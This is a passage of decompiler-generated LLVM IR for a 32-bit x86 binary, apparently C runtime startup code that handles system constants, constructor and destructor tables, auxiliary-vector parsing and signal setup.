dec_label_pc_804ef7d:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef84:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef8b:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efa0:                             ; preds = %dec_label_pc_804ef54, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804eeab
  br label %dec_label_pc_804efcd

dec_label_pc_804efa5:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efac:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efb3:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efba:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efc1:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efc8:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804efcd:                             ; preds = %dec_label_pc_804efc1, %dec_label_pc_804efba, %dec_label_pc_804efb3, %dec_label_pc_804efac, %dec_label_pc_804efa5, %dec_label_pc_804ef99, %dec_label_pc_804ef92, %dec_label_pc_804ef8b, %dec_label_pc_804ef84, %dec_label_pc_804ef7d, %dec_label_pc_804ef6f, %dec_label_pc_804ef68, %dec_label_pc_804ef76, %dec_label_pc_804ef4d, %dec_label_pc_804ef43, %dec_label_pc_804ef39, %dec_label_pc_804ef2f, %dec_label_pc_804ef25, %dec_label_pc_804ef1b, %dec_label_pc_804ef11, %dec_label_pc_804ef07, %dec_label_pc_804eefd, %dec_label_pc_804eef3, %dec_label_pc_804eee1, %dec_label_pc_804eecf, %dec_label_pc_804eec5, %dec_label_pc_804eebb, %dec_label_pc_804eea1, %dec_label_pc_804efa0, %dec_label_pc_804efc8
  %v0_804efd0 = phi i32 [ 255, %dec_label_pc_804efc1 ], [ 2048, %dec_label_pc_804efba ], [ 99, %dec_label_pc_804efb3 ], [ 20, %dec_label_pc_804efac ], [ -128, %dec_label_pc_804efa5 ], [ 1024, %dec_label_pc_804ef99 ], [ 4, %dec_label_pc_804ef92 ], [ 32, %dec_label_pc_804ef8b ], [ 256, %dec_label_pc_804ef84 ], [ 2147483647, %dec_label_pc_804ef7d ], [ 16, %dec_label_pc_804ef6f ], [ 127, %dec_label_pc_804ef68 ], [ 200112, %dec_label_pc_804ef76 ], [ 9, %dec_label_pc_804ef4d ], [ 65535, %dec_label_pc_804ef43 ], [ -32768, %dec_label_pc_804ef39 ], [ -2147483648, %dec_label_pc_804ef2f ], [ 8, %dec_label_pc_804ef25 ], [ 500, %dec_label_pc_804ef1b ], [ 4096, %dec_label_pc_804ef11 ], [ 16384, %dec_label_pc_804ef07 ], [ 1000, %dec_label_pc_804eefd ], [ 32768, %dec_label_pc_804eef3 ], [ 6, %dec_label_pc_804eee1 ], [ 65536, %dec_label_pc_804eecf ], [ 100, %dec_label_pc_804eec5 ], [ 131072, %dec_label_pc_804eebb ], [ 1, %dec_label_pc_804eea1 ], [ -1, %dec_label_pc_804efa0 ], [ 32767, %dec_label_pc_804efc8 ]
  ret i32 %v0_804efd0

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 8, 0, 1, 2 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 19, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_804efcd, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804efa0, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804ef76, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804eef3, { 1, 0 }
  uselistorder label %dec_label_pc_804eee1, { 1, 0 }
}

define i32 @function_804efd4() local_unnamed_addr {
dec_label_pc_804efd4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804efd4 = load i32, i32* @ebx, align 4
  store i32 %v0_804efd4, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 0), label %dec_label_pc_804efe8, label %dec_label_pc_804eff5

dec_label_pc_804efe8:                             ; preds = %dec_label_pc_804efd4, %dec_label_pc_804efe8
  %v1_804efef8 = phi i32 [ %v1_804efef, %dec_label_pc_804efe8 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 -1), %dec_label_pc_804efd4 ]
  store i32 ptrtoint (i32* @global_var_804efef.174 to i32), i32* %stack_var_-16, align 4
  %v5_804efe8 = mul i32 %v1_804efef8, 4
  %v6_804efe8 = add i32 %v5_804efe8, ptrtoint (i32* @global_var_8055a08.173 to i32)
  %v7_804efe8 = inttoptr i32 %v6_804efe8 to i32*
  %v8_804efe8 = load i32, i32* %v7_804efe8, align 4
  call void @__pseudo_call(i32 %v8_804efe8)
  %v0_804efef.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804efef = add i32 %v0_804efef.pre, -1
  store i32 %v1_804efef, i32* %ebx.global-to-local, align 4
  %v10_804eff0 = icmp eq i32 %v0_804efef.pre, 0
  %v1_804eff3 = icmp eq i1 %v10_804eff0, false
  br i1 %v1_804eff3, label %dec_label_pc_804efe8, label %dec_label_pc_804eff5

dec_label_pc_804eff5:                             ; preds = %dec_label_pc_804efe8, %dec_label_pc_804efd4
  %v0_804eff5 = load i32, i32* @global_var_8058474.175, align 4
  %v1_804effa = icmp eq i32 %v0_804eff5, 0
  br i1 %v1_804effa, label %dec_label_pc_804f000, label %dec_label_pc_804effe

dec_label_pc_804effe:                             ; preds = %dec_label_pc_804eff5
  %v0_804effe = load i32, i32* %stack_var_-16, align 4
  %v1_804effe = call i32 @unknown_0(i32 %v0_804effe)
  br label %dec_label_pc_804f000

dec_label_pc_804f000:                             ; preds = %dec_label_pc_804effe, %dec_label_pc_804eff5
  %v0_804f000 = load i32, i32* @global_var_8058478.176, align 8
  %v1_804f006 = icmp eq i32 %v0_804f000, 0
  br i1 %v1_804f006, label %dec_label_pc_804f00f, label %dec_label_pc_804f00a

dec_label_pc_804f00a:                             ; preds = %dec_label_pc_804f000
  %v2_804f00a = load i32, i32* %stack_var_-16, align 4
  %v1_804f00d = call i32 @unknown_0(i32 %v2_804f00a)
  br label %dec_label_pc_804f00f

dec_label_pc_804f00f:                             ; preds = %dec_label_pc_804f00a, %dec_label_pc_804f000
  %v2_804f00f = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804f00f

; uselistorder directives
  uselistorder i32 %v1_804efef, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804efe8, { 1, 0 }
}

define i32 @function_804f013(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f013:
  ret i32 0
}

define i32 @function_804f016(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f016:
  %v0_804f016 = load i32, i32* @eax, align 4
  ret i32 %v0_804f016
}

define i32 @function_804f017() local_unnamed_addr {
dec_label_pc_804f017:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804f017 = load i32, i32* @esi, align 4
  %v0_804f018 = load i32, i32* @eax, align 4
  store i32 %v0_804f018, i32* @esi, align 4
  %v0_804f01a = load i32, i32* @ebx, align 4
  store i32 %v0_804f01a, i32* %stack_var_-8, align 4
  %v0_804f01b = load i32, i32* @edx, align 4
  store i32 %v0_804f01b, i32* @ebx, align 4
  %v5_804f023 = call i32 @function_804f39c(i32 %v0_804f018, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804f02b = add i32 %v5_804f023, 1
  %v8_804f02b = icmp eq i32 %v1_804f02b, 0
  %v1_804f02c = icmp eq i1 %v8_804f02b, false
  br i1 %v1_804f02c, label %dec_label_pc_804f047, label %dec_label_pc_804f02e

dec_label_pc_804f02e:                             ; preds = %dec_label_pc_804f017
  %v0_804f030 = load i32, i32* @ebx, align 4
  %v5_804f036 = call i32 @function_804f6b0(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054280.177, i32 0, i32 0), i32 %v0_804f030, i32 %v1_804f02b)
  %v1_804f03e = load i32, i32* @esi, align 4
  %v12_804f03e = icmp eq i32 %v5_804f036, %v1_804f03e
  br i1 %v12_804f03e, label %dec_label_pc_804f047, label %dec_label_pc_804f042

dec_label_pc_804f042:                             ; preds = %dec_label_pc_804f02e
  %v0_804f042 = call i32 @function_804e640()
  br label %dec_label_pc_804f047

dec_label_pc_804f047:                             ; preds = %dec_label_pc_804f02e, %dec_label_pc_804f017, %dec_label_pc_804f042
  %v2_804f047 = load i32, i32* %stack_var_-12, align 4
  %v2_804f048 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f048, i32* @ebx, align 4
  store i32 %v0_804f017, i32* @esi, align 4
  ret i32 %v2_804f047

; uselistorder directives
  uselistorder i32 ()* @function_804e640, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f047, { 2, 0, 1 }
}

define i32 @function_804f04b() local_unnamed_addr {
dec_label_pc_804f04b:
  %v0_804f04e = load i8, i8* @global_var_805847c.178, align 4
  %v1_804f04e = icmp eq i8 %v0_804f04e, 0
  %v1_804f055 = icmp eq i1 %v1_804f04e, false
  br i1 %v1_804f055, label %dec_label_pc_804f04b.dec_label_pc_804f087_crit_edge, label %dec_label_pc_804f057

dec_label_pc_804f04b.dec_label_pc_804f087_crit_edge: ; preds = %dec_label_pc_804f04b
  %v0_804f08a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f087

dec_label_pc_804f057:                             ; preds = %dec_label_pc_804f04b
  store i8 1, i8* @global_var_805847c.178, align 4
  store i32 4096, i32* @global_var_8058470.179, align 16
  %v0_804f082 = call i32 @function_804bf0c()
  br label %dec_label_pc_804f087

dec_label_pc_804f087:                             ; preds = %dec_label_pc_804f04b.dec_label_pc_804f087_crit_edge, %dec_label_pc_804f057
  %v0_804f08a = phi i32 [ %v0_804f08a.pre, %dec_label_pc_804f04b.dec_label_pc_804f087_crit_edge ], [ %v0_804f082, %dec_label_pc_804f057 ]
  ret i32 %v0_804f08a

; uselistorder directives
  uselistorder i8* @global_var_805847c.178, { 1, 0 }
  uselistorder label %dec_label_pc_804f087, { 1, 0 }
}

define i32 @function_804f08b(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f08b:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_804f08c = load i32, i32* @edi, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8058468.180, align 8
  store i32 %arg6, i32* @global_var_8058478.176, align 8
  %v2_804f0c2 = mul i32 %arg2, 4
  %v3_804f0c2 = add i32 %tmp29, %v2_804f0c2
  %v1_804f0c5 = add i32 %v3_804f0c2, 4
  store i32 %v1_804f0c5, i32* %edx.global-to-local, align 4
  store i32 %v1_804f0c5, i32* @global_var_805846c.171, align 4
  %v3_804f0ce = load i32, i32* %arg3, align 4
  %v14_804f0ce = icmp eq i32 %v1_804f0c5, %v3_804f0ce
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804f0d4 = icmp eq i1 %v14_804f0ce, false
  %v4_804f0d4 = select i1 %v1_804f0d4, i32 %v1_804f0c5, i32 %v3_804f0c2
  store i32 %v4_804f0d4, i32* @global_var_805846c.171, align 4
  %v2_804f0dc = ptrtoint i32* %stack_var_-136 to i32
  %v3_804f0e1 = bitcast i32* %stack_var_-136 to i8*
  %v4_804f0e1 = call i32 @function_804d1d0(i8* %v3_804f0e1, i32 0, i32 120)
  %v0_804f0e6 = load i32, i32* @global_var_805846c.171, align 4
  br label %dec_label_pc_804f0ee

dec_label_pc_804f0ee:                             ; preds = %dec_label_pc_804f0ee, %dec_label_pc_804f08b
  %v0_804f0ee = phi i32 [ %v1_804f0f1, %dec_label_pc_804f0ee ], [ %v0_804f0e6, %dec_label_pc_804f08b ]
  %v1_804f0ee = inttoptr i32 %v0_804f0ee to i32*
  %v2_804f0ee = load i32, i32* %v1_804f0ee, align 4
  %v3_804f0ee = icmp eq i32 %v2_804f0ee, 0
  %v1_804f0f1 = add i32 %v0_804f0ee, 4
  %v1_804f0f4 = icmp eq i1 %v3_804f0ee, false
  br i1 %v1_804f0f4, label %dec_label_pc_804f0ee, label %dec_label_pc_804f115.preheader

dec_label_pc_804f115.preheader:                   ; preds = %dec_label_pc_804f0ee
  store i32 %v1_804f0f1, i32* @ebx, align 4
  %v1_804f1151 = inttoptr i32 %v1_804f0f1 to i32*
  %v2_804f1152 = load i32, i32* %v1_804f1151, align 4
  %v3_804f1153 = icmp eq i32 %v2_804f1152, 0
  %v1_804f11810 = icmp eq i1 %v3_804f1153, false
  br i1 %v1_804f11810, label %dec_label_pc_804f0fa.lr.ph, label %dec_label_pc_804f11a

dec_label_pc_804f0fa.lr.ph:                       ; preds = %dec_label_pc_804f115.preheader
  %v3_804f0d2 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804f105 = add i32 %v3_804f0d2, 32
  br label %dec_label_pc_804f0fa

dec_label_pc_804f0fa:                             ; preds = %dec_label_pc_804f0fa.lr.ph, %dec_label_pc_804f112
  %v1_804f105 = phi i32 [ %v2_804f1152, %dec_label_pc_804f0fa.lr.ph ], [ %v2_804f115, %dec_label_pc_804f112 ]
  %v0_804f104 = phi i32 [ %v1_804f0f1, %dec_label_pc_804f0fa.lr.ph ], [ %v1_804f112, %dec_label_pc_804f112 ]
  %v6_804f0ff = icmp ugt i32 %v1_804f105, 14
  br i1 %v6_804f0ff, label %dec_label_pc_804f112, label %dec_label_pc_804f101

dec_label_pc_804f101:                             ; preds = %dec_label_pc_804f0fa
  %v0_804f101 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f101, i32* %stack_var_-160, align 4
  store i32 %v0_804f104, i32* %stack_var_-168, align 4
  %v2_804f105 = mul i32 %v1_804f105, 8
  %v4_804f105 = add i32 %v3_804f105, %v2_804f105
  %v3_804f10a = inttoptr i32 %v4_804f105 to i16*
  %v4_804f10a = call i32 @function_804d1a8(i16* %v3_804f10a, i32 %v0_804f104, i32 8)
  %v0_804f112.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f112

dec_label_pc_804f112:                             ; preds = %dec_label_pc_804f0fa, %dec_label_pc_804f101
  %v0_804f112 = phi i32 [ %v0_804f104, %dec_label_pc_804f0fa ], [ %v0_804f112.pre, %dec_label_pc_804f101 ]
  %v1_804f112 = add i32 %v0_804f112, 8
  store i32 %v1_804f112, i32* @ebx, align 4
  %v1_804f115 = inttoptr i32 %v1_804f112 to i32*
  %v2_804f115 = load i32, i32* %v1_804f115, align 4
  %v3_804f115 = icmp eq i32 %v2_804f115, 0
  %v1_804f118 = icmp eq i1 %v3_804f115, false
  br i1 %v1_804f118, label %dec_label_pc_804f0fa, label %dec_label_pc_804f11a

dec_label_pc_804f11a:                             ; preds = %dec_label_pc_804f112, %dec_label_pc_804f115.preheader
  store i32 %v2_804f0dc, i32* @eax, align 4
  %v0_804f11e = call i32 @function_8051004()
  store i32 %v0_804f11e, i32* @eax, align 4
  %v0_804f123 = call i32 @function_804f04b()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_804f131 = icmp eq i32 %tmp24, 0
  %v3_804f133 = select i1 %v1_804f131, i32 4096, i32 %tmp24
  %v13_804f136 = icmp eq i32 %tmp23, -1
  store i32 %v3_804f133, i32* @global_var_8058470.179, align 16
  %v1_804f140 = icmp eq i1 %v13_804f136, false
  br i1 %v1_804f140, label %dec_label_pc_804f16b, label %dec_label_pc_804f142

dec_label_pc_804f142:                             ; preds = %dec_label_pc_804f11a
  %v0_804f142 = call i32 @function_804f620()
  store i32 %v0_804f142, i32* @ebx, align 4
  %v0_804f149 = call i32 @function_804f588()
  %v0_804f14e = load i32, i32* @ebx, align 4
  %v12_804f14e = icmp eq i32 %v0_804f14e, %v0_804f149
  %v1_804f150 = icmp eq i1 %v12_804f14e, false
  br i1 %v1_804f150, label %dec_label_pc_804f181, label %dec_label_pc_804f152

dec_label_pc_804f152:                             ; preds = %dec_label_pc_804f142
  %v0_804f152 = call i32 @function_804f5b0()
  store i32 %v0_804f152, i32* @ebx, align 4
  %v0_804f159 = call i32 @function_804f560()
  %v0_804f15e = load i32, i32* @ebx, align 4
  %v12_804f15e = icmp eq i32 %v0_804f15e, %v0_804f159
  %v1_804f160 = icmp eq i1 %v12_804f15e, false
  br i1 %v1_804f160, label %dec_label_pc_804f181, label %dec_label_pc_804f162.thread

dec_label_pc_804f162.thread:                      ; preds = %dec_label_pc_804f152
  br label %dec_label_pc_804f1ab

dec_label_pc_804f16b:                             ; preds = %dec_label_pc_804f11a
  %v15_804f16b = icmp eq i32 %tmp23, %tmp22
  %v1_804f16f = icmp eq i1 %v15_804f16b, false
  br i1 %v1_804f16f, label %dec_label_pc_804f181, label %dec_label_pc_804f171

dec_label_pc_804f171:                             ; preds = %dec_label_pc_804f16b
  br label %dec_label_pc_804f181

dec_label_pc_804f181:                             ; preds = %dec_label_pc_804f171, %dec_label_pc_804f16b, %dec_label_pc_804f152, %dec_label_pc_804f142
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804f188 = call i32 @function_804f017()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804f197 = call i32 @function_804f017()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804f1a6 = call i32 @function_804f017()
  br label %dec_label_pc_804f1ab

dec_label_pc_804f1ab:                             ; preds = %dec_label_pc_804f162.thread, %dec_label_pc_804f181
  %v0_804f1ab = load i32, i32* @edi, align 4
  %v1_804f1ab = inttoptr i32 %v0_804f1ab to i32*
  %v2_804f1ab = load i32, i32* %v1_804f1ab, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804f1ab, i32* inttoptr (i32 134569368 to i32*), align 8
  store i32 %arg5, i32* @global_var_8058474.175, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 0), label %dec_label_pc_804f1d0, label %dec_label_pc_804f1dc

dec_label_pc_804f1d0:                             ; preds = %dec_label_pc_804f1ab, %dec_label_pc_804f1d0
  %v4_804f1d050 = phi i32 [ %v1_804f1d7, %dec_label_pc_804f1d0 ], [ 0, %dec_label_pc_804f1ab ]
  store i32 ptrtoint (i32* @global_var_804f1d7.182 to i32), i32* %stack_var_-160, align 4
  %v5_804f1d0 = mul i32 %v4_804f1d050, 4
  %v6_804f1d0 = add i32 %v5_804f1d0, ptrtoint (i32* @global_var_8055a08.173 to i32)
  %v7_804f1d0 = inttoptr i32 %v6_804f1d0 to i32*
  %v8_804f1d0 = load i32, i32* %v7_804f1d0, align 4
  call void @__pseudo_call(i32 %v8_804f1d0)
  %v0_804f1d7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1d7 = add i32 %v0_804f1d7, 1
  store i32 %v1_804f1d7, i32* %ebx.global-to-local, align 4
  %v1_804f1d8 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f1d8 = icmp ult i32 %v1_804f1d7, %v1_804f1d8
  br i1 %v7_804f1d8, label %dec_label_pc_804f1d0, label %dec_label_pc_804f1dc

dec_label_pc_804f1dc:                             ; preds = %dec_label_pc_804f1d0, %dec_label_pc_804f1ab
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 0), label %dec_label_pc_804f1f4, label %dec_label_pc_804f200

dec_label_pc_804f1f4:                             ; preds = %dec_label_pc_804f1dc, %dec_label_pc_804f1f4
  %v4_804f1f444 = phi i32 [ %v1_804f1fb, %dec_label_pc_804f1f4 ], [ 0, %dec_label_pc_804f1dc ]
  store i32 ptrtoint (i32* @global_var_804f1fb.183 to i32), i32* %stack_var_-160, align 4
  %v5_804f1f4 = mul i32 %v4_804f1f444, 4
  %v6_804f1f4 = add i32 %v5_804f1f4, ptrtoint (i32* @global_var_8055a08.173 to i32)
  %v7_804f1f4 = inttoptr i32 %v6_804f1f4 to i32*
  %v8_804f1f4 = load i32, i32* %v7_804f1f4, align 4
  call void @__pseudo_call(i32 %v8_804f1f4)
  %v0_804f1fb = load i32, i32* @ebx, align 4
  %v1_804f1fb = add i32 %v0_804f1fb, 1
  store i32 %v1_804f1fb, i32* @ebx, align 4
  %v1_804f1fc.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804f1fc = icmp ult i32 %v1_804f1fb, %v1_804f1fc.pre
  br i1 %v7_804f1fc, label %dec_label_pc_804f1f4, label %dec_label_pc_804f200

dec_label_pc_804f200:                             ; preds = %dec_label_pc_804f1f4, %dec_label_pc_804f1dc
  %v0_804f209 = load i32, i32* %stack_var_-160, align 4
  %v1_804f209 = call i32 @function_804b7f4(i32 %v0_804f209)
  %v1_804f20e = inttoptr i32 %v1_804f209 to i32*
  store i32 0, i32* %v1_804f20e, align 4
  %v0_804f21d = call i32 @function_804f828()
  store i32 %v0_804f21d, i32* @eax, align 4
  %v1_804f222 = inttoptr i32 %v0_804f21d to i32*
  store i32 0, i32* %v1_804f222, align 4
  %v0_804f228 = load i32, i32* @eax, align 4
  store i32 %v0_804f228, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804f08c)
  %v0_804f23e = load i32, i32* @eax, align 4
  %v1_804f241 = call i32 @function_804ec2c(i32 %v0_804f23e)
  %v0_804f24d = load i32, i32* @ebx, align 4
  %v1_804f24d = inttoptr i32 %v0_804f24d to %sigcontext*
  %v2_804f24d = call i32 @sigreturn(%sigcontext* %v1_804f24d)
  %v0_804f255 = load i32, i32* @ebx, align 4
  %v1_804f255 = inttoptr i32 %v0_804f255 to %sigcontext*
  %v2_804f255 = call i32 @sigreturn(%sigcontext* %v1_804f255)
  ret i32 %v2_804f255

; uselistorder directives
  uselistorder i32 %v1_804f1fb, { 1, 2, 0 }
  uselistorder i32 %v1_804f1d7, { 1, 2, 0 }
  uselistorder i32 %v2_804f115, { 1, 0 }
  uselistorder i32 %v1_804f112, { 2, 1, 0 }
  uselistorder i32 %v1_804f0f1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f0ee, { 1, 0 }
  uselistorder i32 %v1_804f0c5, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_804ec2c, { 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055a08.173 to i32), i32 -134568456), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @function_804f017, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804f1f4, { 1, 0 }
  uselistorder label %dec_label_pc_804f1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f112, { 1, 0 }
  uselistorder label %dec_label_pc_804f0fa, { 1, 0 }
}

define i32 @function_804f257(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f257:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804f257 = load i32, i32* @esi, align 4
  %v0_804f258 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804f26d = icmp eq i32* %arg2, null
  br i1 %v1_804f26d, label %dec_label_pc_804f2c1, label %dec_label_pc_804f271

dec_label_pc_804f271:                             ; preds = %dec_label_pc_804f257
  %v2_804f271 = load i32, i32* %arg2, align 4
  store i32 %v2_804f271, i32* %stack_var_-148, align 4
  %v1_804f27a = add i32 %tmp11, 4
  %v3_804f28c = bitcast i32* %stack_var_-136 to i16*
  %v4_804f28c = call i32 @function_804d1a8(i16* %v3_804f28c, i32 %v1_804f27a, i32 128)
  br label %dec_label_pc_804f2c1

dec_label_pc_804f2c1:                             ; preds = %dec_label_pc_804f257, %dec_label_pc_804f271
  %v1_804f2c3 = icmp eq i32 %arg3, 0
  br i1 %v1_804f2c3, label %dec_label_pc_804f2cb, label %dec_label_pc_804f2c7

dec_label_pc_804f2c7:                             ; preds = %dec_label_pc_804f2c1
  %v2_804f2c7 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804f2cb

dec_label_pc_804f2cb:                             ; preds = %dec_label_pc_804f2c1, %dec_label_pc_804f2c7
  %v0_804f2da = phi i32 [ 0, %dec_label_pc_804f2c1 ], [ %v2_804f2c7, %dec_label_pc_804f2c7 ]
  br i1 %v1_804f26d, label %dec_label_pc_804f2d8, label %dec_label_pc_804f2d1

dec_label_pc_804f2d1:                             ; preds = %dec_label_pc_804f2cb
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804f2d8

dec_label_pc_804f2d8:                             ; preds = %dec_label_pc_804f2cb, %dec_label_pc_804f2d1
